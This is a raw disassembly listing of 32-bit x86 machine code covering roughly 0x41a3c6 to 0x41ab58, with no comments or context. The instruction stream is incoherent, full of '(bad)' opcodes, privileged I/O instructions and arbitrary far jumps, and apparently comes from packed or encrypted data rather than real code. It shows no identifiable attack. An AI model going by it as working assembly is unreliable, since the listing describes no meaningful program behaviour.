  41a3c6:	gs jle 0x41a3b5
  41a3c9:	inc    ebp
  41a3ca:	mov    bl,0x52
  41a3cc:	(bad)  
  41a3cd:	ds xor al,0x1
  41a3d0:	mov    edi,0x91b4d6b7
  41a3d5:	mov    al,0xa9
  41a3d7:	scas   eax,DWORD PTR es:[edi]
  41a3d8:	cs mov es,ecx
  41a3db:	dec    esp
  41a3dc:	out    0xd8,al
  41a3de:	call   0xeb8f:0xc4df2a14
  41a3e5:	(bad)  
  41a3e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3e8:	sbb    bh,dh
  41a3ea:	push   ds
  41a3eb:	fist   WORD PTR [ebx+0x294d3147]
  41a3f1:	psraw  mm0,QWORD PTR [esi+ebp*1-0x80]
  41a3f6:	mov    ecx,0xe2903f7d
  41a3fb:	xchg   ebp,eax
  41a3fc:	pop    ds
  41a3fd:	or     DWORD PTR [ebx-0x6a],0x7ccfb427
  41a404:	sahf   
  41a405:	jmp    0xf6d9:0x62ee94e1
  41a40c:	push   ebp
  41a40d:	mov    dh,0xe1
  41a40f:	push   esi
  41a410:	pop    ebp
  41a411:	not    DWORD PTR [esi+0x6f]
  41a414:	jnp    0x41a412
  41a416:	fucom  st(5)
  41a418:	xlat   BYTE PTR fs:[ebx]
  41a41a:	mov    cl,0xc1
  41a41c:	cdq    
  41a41d:	pop    edi
  41a41e:	cli    
  41a41f:	mov    ebx,0x338651
  41a424:	daa    
  41a425:	ficomp DWORD PTR [ecx+0x3]
  41a428:	push   ds
  41a429:	fcomp  st(7)
  41a42c:	pop    esp
  41a42d:	das    
  41a42e:	stos   DWORD PTR es:[edi],eax
  41a42f:	inc    edx
  41a430:	adc    DWORD PTR [ecx+0x2527fb44],esp
  41a436:	call   0x35b6b927
  41a43b:	gs int 0x54
  41a43e:	or     DWORD PTR [edi-0xc0df16c],ebp
  41a444:	sbb    esi,ebp
  41a446:	rcr    BYTE PTR [ecx+0xcbb125b],0x45
  41a44d:	or     DWORD PTR [esi],0xffffff91
  41a450:	and    ebp,DWORD PTR [eax-0x79]
  41a453:	hlt    
  41a454:	into   
  41a455:	push   esp
  41a456:	mov    ebx,0xa70c03a1
  41a45b:	sbb    al,ch
  41a45d:	add    dl,BYTE PTR [ebx]
  41a45f:	pusha  
  41a460:	sbb    BYTE PTR [esi],0xc4
  41a463:	inc    edx
  41a464:	or     eax,0x1fa397d8
  41a469:	pop    edx
  41a46a:	xor    dl,BYTE PTR [edx-0x12d7cfff]
  41a470:	int3   
  41a471:	xor    esp,DWORD PTR [ebx]
  41a473:	aas    
  41a474:	pcmpeqw mm7,QWORD PTR [eax-0x4e]
  41a478:	stos   DWORD PTR es:[edi],eax
  41a479:	sub    DWORD PTR [edi+0x6fa2b4d3],0xffffff99
  41a480:	div    BYTE PTR [edx-0x57]
  41a483:	push   ds
  41a484:	fcomp  QWORD PTR [ecx+0x69]
  41a487:	fidivr WORD PTR [ebp-0x23]
  41a48a:	mov    al,ds:0xa49b8d46
  41a48f:	js     0x41a4a7
  41a491:	sar    DWORD PTR [ecx],0xe0
  41a494:	outs   dx,BYTE PTR ds:[esi]
  41a495:	mov    esp,0xcbbc245e
  41a49a:	jno    0x41a517
  41a49c:	pop    ebx
  41a49d:	mov    al,ds:0x993bde8f
  41a4a2:	popa   
  41a4a3:	out    0x1f,eax
  41a4a5:	daa    
  41a4a6:	out    0x32,al
  41a4a8:	test   BYTE PTR [eax+0x66083e7c],bl
  41a4ae:	jg     0x41a4c0
  41a4b0:	cmp    bl,ah
  41a4b2:	call   0xc2ec:0x4531b358
  41a4b9:	xor    al,0x5a
  41a4bb:	dec    ebx
  41a4bc:	dec    esp
  41a4bd:	jb     0x41a4d4
  41a4bf:	push   ds
  41a4c0:	scas   eax,DWORD PTR es:[edi]
  41a4c1:	shl    DWORD PTR [edi-0x5d],1
  41a4c4:	stos   DWORD PTR es:[edi],eax
  41a4c5:	ins    DWORD PTR es:[edi],dx
  41a4c6:	mov    cl,0x8e
  41a4c8:	add    BYTE PTR [edx-0x51],0x5c
  41a4cc:	dec    edx
  41a4cd:	pop    esi
  41a4ce:	aas    
  41a4cf:	mov    ebx,0xb7fc819b
  41a4d4:	cwde   
  41a4d5:	or     DWORD PTR [ecx+0x40],ecx
  41a4d8:	out    dx,eax
  41a4d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4da:	xor    BYTE PTR ss:[esi+0x31],ah
  41a4de:	sub    DWORD PTR [edi+0x644a1b6a],ebp
  41a4e4:	out    0x39,eax
  41a4e6:	push   ds
  41a4e7:	(bad)  
  41a4e8:	pop    ebx
  41a4e9:	fisttp WORD PTR [esi]
  41a4eb:	push   edi
  41a4ec:	mov    bl,BYTE PTR ds:0x40b57423
  41a4f2:	cdq    
  41a4f3:	ds pop edx
  41a4f5:	aas    
  41a4f6:	xchg   esi,eax
  41a4f7:	pop    edx
  41a4f8:	mov    ecx,0x7adfbf5e
  41a4fd:	(bad)  
  41a4fe:	cmp    edx,DWORD PTR [ebx]
  41a500:	and    al,BYTE PTR [ebx+0x70]
  41a503:	mov    bh,0x35
  41a505:	stos   BYTE PTR es:[edi],al
  41a506:	test   eax,0xb3b93d4b
  41a50b:	test   DWORD PTR [eax-0x333cfc82],0xa90b48c9
  41a515:	lock add al,0x7e
  41a518:	cmp    BYTE PTR [ebp+0x63],ah
  41a51b:	mov    ebp,DWORD PTR [edi-0x666e686e]
  41a521:	mov    ch,0x87
  41a523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a524:	mov    cl,0xd2
  41a526:	pop    ebx
  41a527:	inc    ebx
  41a528:	idiv   DWORD PTR [ebp-0x4]
  41a52b:	xchg   esi,eax
  41a52c:	xchg   esi,eax
  41a52d:	gs add al,0xd9
  41a530:	icebp  
  41a531:	(bad)  
  41a532:	(bad)  
  41a534:	daa    
  41a535:	fpatan 
  41a537:	xor    BYTE PTR ds:0x10d77963,al
  41a53d:	cmc    
  41a53e:	xor    edx,edx
  41a540:	aas    
  41a541:	out    dx,eax
  41a542:	pop    esp
  41a543:	xor    eax,0x273d9445
  41a548:	cdq    
  41a549:	dec    edx
  41a54a:	js     0x41a576
  41a54c:	mov    cl,0xed
  41a54e:	pop    eax
  41a54f:	pop    ebx
  41a550:	xlat   BYTE PTR ds:[ebx]
  41a551:	jns    0x41a5a3
  41a553:	rol    DWORD PTR [eax-0x37],cl
  41a556:	pushf  
  41a557:	push   edi
  41a558:	or     eax,0x5602ce5d
  41a55d:	mov    DWORD PTR [edi+0x6d130534],esi
  41a563:	imul   ebx,DWORD PTR [edi+0x69],0xffffffc4
  41a567:	test   BYTE PTR [ebx+0x16],bl
  41a56a:	mov    ah,0x23
  41a56c:	mov    dh,ah
  41a56e:	repz push cs
  41a570:	sub    al,0xbc
  41a572:	sbb    DWORD PTR [ecx-0x6b],0xffffffa6
  41a576:	(bad)  
  41a577:	mov    edi,0x66fad0ac
  41a57c:	jecxz  0x41a5b6
  41a57e:	stos   BYTE PTR es:[edi],al
  41a57f:	push   esi
  41a580:	sbb    ebx,DWORD PTR [esi]
  41a582:	jmp    0xec42:0xfc0e2945
  41a589:	into   
  41a58a:	add    DWORD PTR fs:[ebp-0x644428c6],esi
  41a591:	fwait
  41a592:	mul    BYTE PTR [eax-0x13]
  41a595:	xchg   bl,dh
  41a597:	outs   dx,BYTE PTR ds:[esi]
  41a598:	mov    BYTE PTR [edi-0xf],bl
  41a59b:	pop    ecx
  41a59c:	jno    0x41a562
  41a59e:	pushf  
  41a59f:	xor    ch,BYTE PTR [ebx+0x620bd9de]
  41a5a5:	xchg   BYTE PTR [ecx+0x6b],bl
  41a5a8:	(bad)  
  41a5aa:	push   edi
  41a5ab:	add    DWORD PTR [eax-0x42d815fd],0x5da2de93
  41a5b5:	pop    edi
  41a5b6:	pop    ds
  41a5b7:	dec    edx
  41a5b8:	or     esp,DWORD PTR [edx]
  41a5ba:	mov    ebp,DWORD PTR ds:0xb9e7823
  41a5c0:	xor    esi,ebx
  41a5c2:	data16 xor BYTE PTR [ebp-0x4a7e99f2],ch
  41a5c9:	scas   eax,DWORD PTR es:[edi]
  41a5ca:	pop    esp
  41a5cb:	arpl   WORD PTR [eax],ax
  41a5cd:	fstp   st(5)
  41a5cf:	mov    ds:0x5237296a,al
  41a5d4:	fcmovbe st,st(3)
  41a5d6:	jmp    DWORD PTR [eax+0x5b]
  41a5d9:	jno    0x41a64c
  41a5db:	add    DWORD PTR [ebx+0x4e23b39a],esi
  41a5e1:	mov    ch,0x43
  41a5e3:	(bad)  
  41a5e4:	in     eax,0x9e
  41a5e6:	xor    al,0xb0
  41a5e8:	jns    0x41a56a
  41a5ea:	xchg   edi,eax
  41a5eb:	mov    WORD PTR [ecx],es
  41a5ed:	cdq    
  41a5ee:	aad    0x9c
  41a5f0:	xchg   edi,eax
  41a5f1:	fs das 
  41a5f3:	push   esi
  41a5f4:	fistp  WORD PTR [edx+0x482bf84f]
  41a5fa:	add    al,0x33
  41a5fc:	xor    bh,BYTE PTR [eax-0x777ea59c]
  41a602:	(bad)  
  41a603:	int    0x5e
  41a605:	pop    eax
  41a606:	fwait
  41a607:	loope  0x41a686
  41a609:	jg     0x41a64f
  41a60b:	fnstcw WORD PTR [ebx+0x200c9147]
  41a611:	(bad)  
  41a612:	mov    dl,0x8e
  41a614:	jbe    0x41a665
  41a616:	push   ecx
  41a617:	mov    cl,0xdc
  41a619:	inc    eax
  41a61a:	push   edi
  41a61b:	(bad)  
  41a61c:	xchg   esp,eax
  41a61d:	inc    ebx
  41a61e:	call   0x50f:0x9f5dd47b
  41a625:	out    dx,al
  41a626:	(bad)  
  41a627:	jp     0x41a5f5
  41a629:	or     DWORD PTR [edx],esi
  41a62b:	and    esp,DWORD PTR [ecx+eiz*4-0x6a376ce1]
  41a632:	jmp    0xd85a2fe7
  41a637:	cwde   
  41a638:	cmp    al,0x78
  41a63a:	and    DWORD PTR [ebx],edi
  41a63c:	push   ebx
  41a63d:	mov    esp,0x5beb0f0a
  41a642:	xor    DWORD PTR ds:0xff03212e,esp
  41a648:	pop    ecx
  41a649:	js     0x41a67e
  41a64b:	mov    eax,ds:0x2d2906a0
  41a650:	mov    ecx,0xc290999c
  41a655:	push   ebx
  41a656:	or     DWORD PTR [eax+ebp*2-0x68],0x53
  41a65b:	mov    edi,0x9c297560
  41a660:	and    esi,DWORD PTR [ebx]
  41a662:	enter  0x16d2,0x21
  41a666:	repnz out 0xfa,eax
  41a669:	inc    eax
  41a66a:	mov    dh,0x45
  41a66c:	fisttp QWORD PTR [ebx+0x4d]
  41a66f:	push   0x63
  41a671:	or     al,0x92
  41a673:	shl    BYTE PTR [ecx+eax*2+0x1e],0x8a
  41a678:	aam    0x76
  41a67a:	test   DWORD PTR [esi+0x1c],ebx
  41a67d:	clc    
  41a67e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a67f:	clc    
  41a680:	mov    al,ds:0xf46fb16d
  41a685:	mov    ?,edx
  41a687:	adc    DWORD PTR [eax],esi
  41a689:	ds aad 0x14
  41a68c:	lods   eax,DWORD PTR ds:[esi]
  41a68d:	aad    0x34
  41a68f:	fisubr WORD PTR [esi+0x6a]
  41a692:	(bad)  
  41a693:	loope  0x41a62a
  41a695:	xchg   DWORD PTR [edi],eax
  41a697:	push   esp
  41a698:	aas    
  41a699:	push   es
  41a69a:	dec    edi
  41a69b:	sbb    cl,0x10
  41a69e:	out    0x48,eax
  41a6a0:	jl     0x41a6bb
  41a6a2:	xor    edi,0x30
  41a6a5:	nop
  41a6a6:	dec    edi
  41a6a7:	lds    esi,FWORD PTR [eax+eiz*2-0x7d5408e1]
  41a6ae:	enter  0xb791,0x34
  41a6b2:	jnp    0x41a649
  41a6b4:	outs   dx,BYTE PTR ds:[esi]
  41a6b5:	sbb    eax,0xd510dcc9
  41a6ba:	pop    es
  41a6bb:	add    bl,BYTE PTR ds:0xe459231e
  41a6c1:	daa    
  41a6c2:	or     ebx,edi
  41a6c4:	lods   al,BYTE PTR ds:[esi]
  41a6c5:	iret   
  41a6c6:	sti    
  41a6c7:	popf   
  41a6c8:	jg     0x41a726
  41a6ca:	push   edx
  41a6cb:	es hlt 
  41a6cd:	hlt    
  41a6ce:	or     al,0x71
  41a6d0:	js     0x41a6cd
  41a6d2:	mov    cl,BYTE PTR [ebp-0x64678e3e]
  41a6d8:	mov    bl,0x96
  41a6da:	or     DWORD PTR [esp+edx*1-0x68df3571],esp
  41a6e1:	adc    ch,BYTE PTR ds:0x72000ac6
  41a6e7:	shl    DWORD PTR [ebx+0x41bab343],1
  41a6ed:	dec    ecx
  41a6ee:	jge    0x41a6a2
  41a6f0:	out    dx,al
  41a6f1:	mov    ?,WORD PTR [edi]
  41a6f3:	into   
  41a6f4:	xchg   dl,cl
  41a6f6:	aam    0xb3
  41a6f8:	dec    ebx
  41a6f9:	and    DWORD PTR [eax-0x2703c7fb],ecx
  41a6ff:	add    ah,dl
  41a701:	mov    esi,0xb5fa8f6c
  41a706:	push   eax
  41a707:	out    dx,al
  41a708:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41a70a:	shl    DWORD PTR [esi-0x58],0x93
  41a70e:	aaa    
  41a70f:	std    
  41a710:	and    BYTE PTR [ebx+eax*1-0x30],bl
  41a714:	and    DWORD PTR [eax+0x2be3ab11],0xffffffb5
  41a71b:	scas   eax,DWORD PTR es:[edi]
  41a71c:	pop    esp
  41a71d:	cli    
  41a71e:	bound  edx,QWORD PTR [ebp+0x2c]
  41a721:	xor    edx,DWORD PTR [esi-0x102bd0f3]
  41a727:	test   al,0xfa
  41a729:	push   esi
  41a72a:	(bad)  
  41a72b:	std    
  41a72c:	inc    ebx
  41a72d:	jle    0x41a795
  41a72f:	cdq    
  41a730:	push   edx
  41a731:	inc    edi
  41a732:	bound  edi,QWORD PTR [esi-0x5f]
  41a735:	jnp    0x41a743
  41a737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a738:	nop
  41a739:	cmc    
  41a73a:	stos   DWORD PTR es:[edi],eax
  41a73b:	sub    DWORD PTR [ecx+ebp*4-0x11017076],0xffffff8f
  41a743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a744:	jo     0x41a705
  41a746:	sub    al,0xa9
  41a748:	pop    esi
  41a749:	jl     0x41a77b
  41a74b:	iret   
  41a74c:	das    
  41a74d:	add    al,BYTE PTR [esi]
  41a74f:	ret    
  41a750:	sbb    eax,0x7761b913
  41a755:	pop    ss
  41a756:	sbb    ebx,DWORD PTR [edi+ecx*1+0x0]
  41a75a:	lock mov esp,0xf844dfa4
  41a760:	jae    0x41a7b1
  41a762:	mov    dl,0xec
  41a764:	sub    eax,0x5122a144
  41a769:	addr16 push eax
  41a76b:	sbb    eax,0x46830cf7
  41a770:	lea    eax,[ecx]
  41a772:	repnz mov eax,0x77073832
  41a778:	(bad)
  41a77d:	enter  0x5b7,0xec
  41a781:	outs   dx,DWORD PTR ds:[esi]
  41a782:	xor    BYTE PTR ds:0xd115865,al
  41a788:	fmul   QWORD PTR ds:0xd8b3c423
  41a78e:	out    dx,al
  41a78f:	push   cs
  41a790:	push   edx
  41a791:	sbb    dl,BYTE PTR [eax-0x6b]
  41a794:	pop    esi
  41a795:	mov    BYTE PTR [esi],ch
  41a797:	add    al,BYTE PTR [edi+eax*2-0x2844a2c]
  41a79e:	enter  0x1d90,0xb7
  41a7a2:	add    al,0x12
  41a7a4:	jp     0x41a7cc
  41a7a6:	out    0x88,eax
  41a7a8:	mov    edx,0x74c1693
  41a7ad:	sar    DWORD PTR [edx+0x42],cl
  41a7b0:	addr16 sub bh,cl
  41a7b3:	cmp    esi,DWORD PTR [ecx-0x6f]
  41a7b6:	dec    eax
  41a7b7:	dec    esp
  41a7b8:	mov    bl,0x42
  41a7ba:	xor    DWORD PTR ds:0x6035a2b7,0x6031baf
  41a7c4:	mov    ch,0xf7
  41a7c6:	jns    0x41a7a4
  41a7c8:	(bad)  
  41a7c9:	call   0x157a3c26
  41a7ce:	pop    edx
  41a7cf:	in     eax,dx
  41a7d0:	popf   
  41a7d1:	mov    WORD PTR [edi+0x68ae20f0],es
  41a7d7:	test   eax,0x1e011f69
  41a7dc:	arpl   WORD PTR [ebp-0x4f08f629],si
  41a7e2:	pop    ecx
  41a7e3:	jmp    0x41a7b1
  41a7e5:	or     eax,DWORD PTR [ebp-0x6578e6fe]
  41a7eb:	xor    cl,0xcf
  41a7ee:	pop    ecx
  41a7ef:	fidiv  WORD PTR [ebx-0x50]
  41a7f2:	and    al,0xb2
  41a7f4:	jmp    0x41a875
  41a7f6:	enter  0x7f42,0x82
  41a7fa:	or     BYTE PTR [edi+0x5ec3e46],al
  41a800:	shl    DWORD PTR [edi],0x1e
  41a803:	in     al,0x35
  41a805:	add    DWORD PTR [edi+0x61],eax
  41a808:	pop    ebp
  41a809:	(bad)  
  41a80a:	mov    eax,DWORD PTR [ebp-0x5e5e627]
  41a810:	pop    ebx
  41a811:	jo     0x41a7d6
  41a813:	xchg   esp,eax
  41a814:	je     0x41a867
  41a816:	mov    esp,gs
  41a818:	scas   al,BYTE PTR es:[edi]
  41a819:	mov    eax,ds:0xd5e31a70
  41a81e:	lods   al,BYTE PTR ds:[esi]
  41a81f:	adc    eax,0xf0fb633
  41a824:	mov    BYTE PTR [esi-0x29],dl
  41a827:	and    dl,al
  41a829:	aad    0x32
  41a82b:	inc    ebx
  41a82c:	mov    cl,0x92
  41a82e:	mov    ah,0xa4
  41a830:	sub    ebp,0xaf49c5b0
  41a836:	sbb    eax,0xa76d16c7
  41a83b:	rol    BYTE PTR [edx],0x98
  41a83e:	jg     0x41a7dc
  41a840:	rcr    DWORD PTR ds:0x524330fb,0x8
  41a847:	cld    
  41a848:	cmp    eax,DWORD PTR [esp+edx*1]
  41a84b:	jg     0x41a808
  41a84d:	daa    
  41a84e:	pop    eax
  41a84f:	stos   DWORD PTR es:[edi],eax
  41a850:	ret    0xd195
  41a853:	sbb    eax,DWORD PTR [ebx-0x313d8947]
  41a859:	shl    DWORD PTR [edx+eiz*1],cl
  41a85c:	iret   
  41a85d:	mov    al,ds:0x17b7b42d
  41a862:	and    DWORD PTR [ebx+0x8],edi
  41a865:	pop    ss
  41a866:	push   eax
  41a867:	pop    DWORD PTR [ecx+0x3f]
  41a86a:	fs cmp ebx,esi
  41a86d:	sub    BYTE PTR [eax-0x41bbe69],bl
  41a873:	ja     0x41a80f
  41a875:	adc    BYTE PTR [ebx+0x3a],ah
  41a878:	inc    ebp
  41a879:	fucomip st,st(0)
  41a87b:	xchg   DWORD PTR [ebx+esi*4-0x2a],esp
  41a87f:	lods   eax,DWORD PTR ds:[esi]
  41a880:	push   edi
  41a881:	add    BYTE PTR [edx],dh
  41a883:	jne    0x41a881
  41a885:	dec    ecx
  41a886:	xor    al,0x84
  41a888:	mov    BYTE PTR [eax],dh
  41a88a:	fisttp QWORD PTR [edi-0x5fbd9e68]
  41a890:	in     eax,dx
  41a891:	mov    al,0xa7
  41a893:	mov    esp,0xcb2014d9
  41a898:	pop    esp
  41a899:	cmp    al,BYTE PTR [edx]
  41a89b:	mov    edi,0xebf04efc
  41a8a0:	jmp    FWORD PTR [eax-0x2a323aa1]
  41a8a6:	std    
  41a8a7:	mov    bl,0x9
  41a8a9:	or     al,BYTE PTR [edi+0x2b241f42]
  41a8af:	imul   esp,DWORD PTR [ecx],0x105debb6
  41a8b5:	mov    al,BYTE PTR [eax+0x27fd1d06]
  41a8bb:	pusha  
  41a8bc:	shl    DWORD PTR [eax-0x12080da0],0x46
  41a8c3:	bound  esi,QWORD PTR [edi+0x29]
  41a8c6:	mov    cl,0xa9
  41a8c8:	pop    esi
  41a8c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8ca:	scas   eax,DWORD PTR es:[edi]
  41a8cb:	pop    esp
  41a8cc:	lahf   
  41a8cd:	jecxz  0x41a91f
  41a8cf:	(bad)  
  41a8d0:	dec    esp
  41a8d1:	or     DWORD PTR ds:0xca1a2e17,ebp
  41a8d7:	mov    ebp,0x5c7e789
  41a8dc:	(bad)
  41a8df:	push   cs
  41a8e0:	or     ebp,ecx
  41a8e2:	or     bh,BYTE PTR [esp+eax*2-0x18]
  41a8e6:	jge    0x41a954
  41a8e8:	ficomp WORD PTR [eax+0x16fc0b]
  41a8ee:	das    
  41a8ef:	mov    ecx,0x4124b8aa
  41a8f4:	stos   BYTE PTR es:[edi],al
  41a8f5:	xor    ebx,DWORD PTR [esi]
  41a8f7:	aam    0x5e
  41a8f9:	fmul   st(0),st
  41a8fb:	pop    edi
  41a8fc:	push   edi
  41a8fd:	mov    WORD PTR [esi+edi*1],?
  41a900:	int    0x4c
  41a902:	je     0x41a8eb
  41a904:	jmp    0x41a985
  41a906:	mov    edi,0x695d19f
  41a90b:	inc    esp
  41a90c:	neg    edi
  41a90e:	fxch   st(3)
  41a910:	fstp   QWORD PTR [eax+0x11993ce7]
  41a916:	xlat   BYTE PTR ds:[ebx]
  41a917:	or     eax,0x14bc74dc
  41a91c:	test   eax,0x45d3fa71
  41a921:	cmp    al,0xad
  41a923:	mov    fs,WORD PTR [edx+eax*2+0x31]
  41a927:	(bad)  
  41a928:	into   
  41a929:	lods   eax,DWORD PTR ss:[esi]
  41a92b:	pop    eax
  41a92c:	rcl    BYTE PTR [edi],1
  41a92e:	inc    esi
  41a92f:	mov    DWORD PTR [ebx-0x2496492e],esp
  41a935:	sbb    al,0x1
  41a937:	pop    es
  41a938:	scas   eax,DWORD PTR es:[edi]
  41a939:	jmp    0x6049e2a1
  41a93e:	sbb    esi,ecx
  41a940:	mov    bh,0x4
  41a942:	ret    
  41a943:	xchg   esi,eax
  41a944:	cmp    ebp,DWORD PTR [ebx-0x339ccd6c]
  41a94a:	mov    al,dh
  41a94c:	sbb    dh,bh
  41a94e:	adc    eax,0x7db8b7
  41a953:	jp     0x41a958
  41a955:	jmp    0x41a9c3
  41a957:	mov    BYTE PTR ss:[ebp+0x6ad2ca3e],dl
  41a95e:	aas    
  41a95f:	in     eax,0xe5
  41a961:	(bad)  [eax-0x1a48cee3]
  41a967:	push   cs
  41a968:	fnstenv [edx-0xe]
  41a96b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a96c:	cmc    
  41a96d:	das    
  41a96e:	jb     0x41a91d
  41a970:	mov    edi,0x896f6285
  41a975:	(bad)  
  41a976:	std    
  41a977:	lahf   
  41a978:	mov    bh,0xf3
  41a97a:	adc    al,0x53
  41a97c:	cwde   
  41a97d:	mov    edi,esi
  41a97f:	retf   0xcbb3
  41a982:	hlt    
  41a983:	mov    dl,BYTE PTR [esp+ecx*4+0x2e63f54e]
  41a98a:	pushf  
  41a98b:	mov    al,ds:0x191e1ffe
  41a990:	aas    
  41a991:	mov    esp,0x563ebeec
  41a996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a997:	out    0x54,eax
  41a999:	add    al,0xc4
  41a99b:	sub    al,0xd
  41a99d:	jbe    0x41a9a9
  41a99f:	mov    ecx,cs
  41a9a1:	ret    0x3ffb
  41a9a4:	ins    BYTE PTR es:[edi],dx
  41a9a5:	pop    esp
  41a9a6:	out    dx,al
  41a9a7:	aas    
  41a9a8:	ret    
  41a9a9:	ins    DWORD PTR es:[edi],dx
  41a9aa:	dec    edi
  41a9ab:	push   es
  41a9ac:	ret    0xcb14
  41a9af:	cmp    ch,BYTE PTR ds:0xf576231b
  41a9b5:	mov    ds:0x1400e659,eax
  41a9ba:	out    0x72,al
  41a9bc:	push   0x808dfbe6
  41a9c1:	adc    eax,0x55f0eef8
  41a9c6:	(bad)  
  41a9c7:	adc    eax,0x8a060541
  41a9cc:	mov    ch,0x64
  41a9ce:	imul   eax,edi,0x59
  41a9d1:	outs   dx,DWORD PTR ds:[esi]
  41a9d2:	mov    esi,0xd55e59a8
  41a9d7:	mov    ch,0xe
  41a9d9:	test   DWORD PTR [edx-0x4c],esi
  41a9dc:	pop    eax
  41a9dd:	push   edi
  41a9de:	push   edx
  41a9df:	pop    eax
  41a9e0:	sbb    edi,DWORD PTR ds:0x87d42533
  41a9e6:	or     BYTE PTR [eax-0xb],0x82
  41a9ea:	jecxz  0x41a9b6
  41a9ec:	rol    bl,0x88
  41a9ef:	cmp    eax,0x95c94376
  41a9f4:	mov    al,ds:0x51a41f89
  41a9f9:	mov    edx,0xe346a751
  41a9fe:	xor    eax,0xc2febc65
  41aa03:	sbb    DWORD PTR [edi+0x10],edi
  41aa06:	jbe    0x41aa4d
  41aa08:	int3   
  41aa09:	cmp    ch,BYTE PTR [eax*1+0x28d0c69f]
  41aa10:	sub    ch,BYTE PTR [edi-0x28]
  41aa13:	sahf   
  41aa14:	enter  0x10a1,0x10
  41aa18:	push   eax
  41aa19:	and    edi,esi
  41aa1b:	cmp    al,0xfd
  41aa1d:	and    DWORD PTR [eax],0x74
  41aa20:	adc    eax,0x2356465e
  41aa25:	sti    
  41aa26:	rcl    DWORD PTR [ebp+0x71],cl
  41aa29:	jns    0x41a9ad
  41aa2b:	pop    es
  41aa2c:	sbb    BYTE PTR [esi-0x3c289588],dh
  41aa32:	mov    dh,0x80
  41aa34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa35:	dec    esp
  41aa36:	pop    ds
  41aa37:	mov    ch,BYTE PTR ds:0x7d032d8f
  41aa3d:	aad    0xb6
  41aa3f:	je     0x41a9ca
  41aa41:	les    ebp,FWORD PTR [ebp+0x60]
  41aa44:	push   edx
  41aa45:	fnstcw WORD PTR ds:0x72b88cba
  41aa4b:	into   
  41aa4c:	es dec esp
  41aa4e:	pushf  
  41aa4f:	pop    edi
  41aa50:	jae    0x41a9f0
  41aa52:	mov    cl,0xeb
  41aa54:	rol    BYTE PTR [ebx+0x6d],0xfa
  41aa58:	fisub  WORD PTR [ebx]
  41aa5a:	or     BYTE PTR [ebx],bh
  41aa5c:	pop    ecx
  41aa5d:	dec    ebx
  41aa5e:	mov    bh,0x30
  41aa60:	bound  esi,QWORD PTR [esp+eax*2]
  41aa63:	mov    es,WORD PTR [ebp+edx*2+0x286f4b49]
  41aa6a:	sub    dl,cl
  41aa6c:	xchg   edi,eax
  41aa6d:	sub    eax,0x262ccf60
  41aa72:	sbb    eax,0x9bccf1f9
  41aa77:	scas   eax,DWORD PTR es:[edi]
  41aa78:	cwd    
  41aa7a:	jmp    0x5aefd866
  41aa7f:	fxch   st(2)
  41aa81:	add    edi,DWORD PTR [ebx]
  41aa83:	adc    DWORD PTR [edi],edi
  41aa85:	xchg   edi,eax
  41aa86:	pop    esi
  41aa87:	repz fmul st(5),st
  41aa8a:	jns    0x41aa4a
  41aa8c:	jmp    0x41aaef
  41aa8e:	jp     0x41aa3c
  41aa90:	xor    eax,0xb7b9969e
  41aa95:	lds    ebp,FWORD PTR [eax]
  41aa97:	bound  ebx,QWORD PTR ss:[eax-0x57]
  41aa9b:	jns    0x41aab2
  41aa9d:	test   BYTE PTR [edx],0x75
  41aaa0:	je     0x41aa70
  41aaa2:	call   0xfe3e:0x46bb71d5
  41aaa9:	dec    esi
  41aaaa:	cmp    ch,BYTE PTR [ecx+esi*1-0x4ee04ad]
  41aab1:	call   0xb15d:0xb74ebb33
  41aab8:	loop   0x41ab28
  41aaba:	mov    ebx,0x477ff1e6
  41aabf:	leave  
  41aac0:	lock jno 0x41aa55
  41aac3:	dec    ebx
  41aac4:	retf   
  41aac5:	ss xchg ebp,eax
  41aac7:	xchg   ecx,eax
  41aac8:	xchg   esp,eax
  41aac9:	enter  0x8af,0xac
  41aacd:	mov    edi,0x67e6dc0e
  41aad2:	(bad)  
  41aad3:	repnz xchg ebp,eax
  41aad5:	call   0x3d59b8b6
  41aada:	and    dh,BYTE PTR [eax]
  41aadc:	sti    
  41aadd:	and    ecx,DWORD PTR [ebp+0x2a47f261]
  41aae3:	in     eax,0x6b
  41aae5:	mov    ebp,0x40ea25fe
  41aaea:	(bad)  
  41aaeb:	ds mov ch,0xbf
  41aaee:	adc    ebp,DWORD PTR [ebx-0x2525b591]
  41aaf4:	sbb    eax,DWORD PTR [edi]
  41aaf6:	pushf  
  41aaf7:	dec    ecx
  41aaf8:	stos   BYTE PTR es:[edi],al
  41aaf9:	cmp    bh,BYTE PTR [ebp+0x44]
  41aafc:	cmp    BYTE PTR ds:0x6b79999d,al
  41ab02:	scas   eax,DWORD PTR es:[edi]
  41ab03:	cmp    edx,eax
  41ab05:	mov    ecx,0x6eb5ea7
  41ab0a:	mov    ds:0xccfd603a,eax
  41ab0f:	repnz inc esp
  41ab11:	push   es
  41ab12:	and    eax,0xfceeb08a
  41ab17:	mov    ah,0x61
  41ab19:	inc    ebx
  41ab1a:	mov    cs,WORD PTR [edi-0x4f6428e4]
  41ab20:	rol    BYTE PTR ds:0x27750360,cl
  41ab26:	jp     0x41ab46
  41ab28:	sub    eax,0xf33366e5
  41ab2d:	fxch   st(1)
  41ab2f:	jo     0x41ab75
  41ab31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab32:	ins    BYTE PTR es:[edi],dx
  41ab33:	sub    ebx,DWORD PTR [edx+0x56178643]
  41ab39:	iret   
  41ab3a:	mov    ds:0xbe56326,eax
  41ab3f:	(bad)  
  41ab40:	xchg   edx,eax
  41ab41:	add    al,BYTE PTR [eax-0x5c]
  41ab44:	pop    eax
  41ab45:	adc    ebx,DWORD PTR [ecx]
  41ab47:	aam    0x33
  41ab49:	mov    edi,0x14a91a7d
  41ab4e:	jns    0x41ab96
  41ab50:	mov    dh,0x87
  41ab52:	fsubr  QWORD PTR [ecx+0x2355fd64]
  41ab58:	sbb    esp,edx
